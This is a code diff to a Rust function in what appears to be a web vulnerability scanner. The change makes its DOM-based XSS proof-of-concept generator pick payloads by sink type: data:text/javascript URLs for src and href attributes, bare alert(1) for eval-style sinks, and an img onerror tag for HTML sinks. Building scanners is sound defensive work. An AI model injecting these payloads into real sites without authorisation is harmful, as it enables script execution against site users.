@@ -100,21 +100,71 @@ fn extract_search_param_value<'a>(payload: &'a str, key: &str) -> &'a str {
 
 pub fn generate_dom_xss_poc(source: &str, sink: &str) -> (String, String) {
     let marker = crate::scanning::markers::class_marker();
+    // Sink-aware payload shape:
+    //   * URL-attribute sinks (`src`, `href`, `xlink:href`, …) receive an
+    //     executable URL scheme (`data:text/javascript,…`) so they fire
+    //     when the framework assigns the value to a real DOM property
+    //     — xss-game L6 is the canonical case (hash → `script.src`).
+    //   * `setAttribute` / `eval` / `Function` / `setTimeout` /
+    //     `setInterval` accept JS source directly.
+    //   * Everything else (`innerHTML`, jQuery `html()`, `document.write`,
+    //     …) renders the payload as HTML, so a tag + event-handler combo
+    //     wins.
+    let is_url_attr_sink = matches!(
+        sink,
+        "src" | "href" | "xlink:href" | "action" | "formaction" | "poster" | "background"
+    );
+    let is_js_eval_sink = matches!(
+        sink,
+        "eval" | "Function" | "setTimeout" | "setInterval" | "execScript" | "execCommand"
+    );
+    let attr_url_payload = format!("data:text/javascript,alert(1)/*{}*/", marker);
+    let js_eval_payload = format!("alert(1)/*{}*/", marker);
+    let html_payload = format!("<img src=x onerror=alert(1) class={}>", marker);
+
     // Generate payload based on the source type
     let payload = if source.contains("location.hash") {
         // Hash-based XSS - use fragment identifier
-        format!("#<img src=x onerror=alert(1) class={}>", marker)
+        if is_url_attr_sink {
+            format!("#{}", attr_url_payload)
+        } else if is_js_eval_sink {
+            format!("#{}", js_eval_payload)
+        } else {
+            format!("#{}", html_payload)
+        }
     } else if let Some(param_name) = extract_search_param_key(source) {
-        format!("{param_name}=<img src=x onerror=alert(1) class={}>", marker)
+        if is_url_attr_sink {
+            format!("{param_name}={}", attr_url_payload)
+        } else if is_js_eval_sink {
+            format!("{param_name}={}", js_eval_payload)
+        } else {
+            format!("{param_name}={}", html_payload)
+        }
     } else if source.contains("location.search") {
         // Query-based XSS
-        format!("xss=<img src=x onerror=alert(1) class={}>", marker)
+        if is_url_attr_sink {
+            format!("xss={}", attr_url_payload)
+        } else if is_js_eval_sink {
+            format!("xss={}", js_eval_payload)
+        } else {
+            format!("xss={}", html_payload)
+        }
     } else if source.contains("location.href") || source.contains("document.URL") {
         // URL-based - could be anywhere
-        format!("#<img src=x onerror=alert(1) class={}>", marker)
+        if is_url_attr_sink {
+            format!("#{}", attr_url_payload)
+        } else if is_js_eval_sink {
+            format!("#{}", js_eval_payload)
+        } else {
+            format!("#{}", html_payload)
+        }
+    } else if is_url_attr_sink {
+        attr_url_payload.clone()
+    } else if is_js_eval_sink {
+        js_eval_payload.clone()
     } else {
         // Generic payload for other sources
-        format!("<img src=x onerror=alert(1) class={}>", marker)
+        html_payload.clone()
     };
 
     let description = format!("DOM-based XSS via {} to {}", source, sink);
